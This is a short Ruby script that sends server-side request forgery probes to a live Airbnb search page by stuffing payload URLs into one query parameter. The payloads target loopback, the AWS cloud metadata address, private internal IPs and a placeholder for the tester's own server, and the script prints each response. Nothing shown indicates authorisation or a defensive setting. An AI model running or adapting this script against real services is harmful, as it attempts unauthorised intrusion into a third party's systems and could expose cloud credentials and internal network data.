require 'net/http'
require 'uri'

# Define the base URL and parameters
base_url = 'https://bg.airbnb.com/s/some-place/homes'
params = {
  'tab_id' => 'home_tab',
  'refinement_paths[]' => '/homes',
  'flexible_trip_lengths[]' => 'one_week',
  'monthly_start_date' => '2024-08-01',
  'monthly_length' => '3',
  'monthly_end_date' => '2024-11-01',
  'price_filter_input_type' => '0',
  'channel' => 'EXPLORE',
  'date_picker_type' => 'calendar',
  'checkin' => '2024-07-18',
  'checkout' => '2024-07-26',
  'search_type' => 'unknown'
}

# List of SSRF payloads to test
ssrf_payloads = [
  'http://127.0.0.1:80',
  'http://localhost:80',
  'http://169.254.169.254/latest/meta-data/', # AWS metadata service
  'http://192.168.1.1:80',  # Common internal router IP
  'http://10.0.0.1:80',     # Another common internal IP
  'http://172.16.0.1:80',   # Internal network range
  'http://<your-public-ip>:8000'  # Your controlled server
]

# Function to perform the SSRF test
def test_ssrf(base_url, params, payload)
  params['refinement_paths[]'] = payload
  uri = URI(base_url)
  uri.query = URI.encode_www_form(params)
  
  begin
    response = Net::HTTP.get_response(uri)
    puts "Testing payload: #{payload}"
    puts "Status Code: #{response.code}"
    puts "Response Content: #{response.body[0..200]}..."  # Print only the first 200 chars for brevity
    puts "\n"
  rescue => e
    puts "Failed to send request for payload #{payload}: #{e.message}"
  end
end

# Iterate over each payload and test
ssrf_payloads.each do |payload|
  test_ssrf(base_url, params, payload)
end
